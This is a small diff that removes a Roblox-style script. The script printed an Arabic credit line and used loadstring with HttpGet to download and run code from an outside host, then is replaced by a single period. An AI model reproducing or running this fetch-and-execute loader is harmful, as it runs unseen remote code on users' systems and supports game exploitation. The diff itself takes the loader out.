@@ -1,3 +1,1 @@
-print("سكربت شات من صنع نيمار")
-
-loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=5030971319515"))("5030971319515")
+.
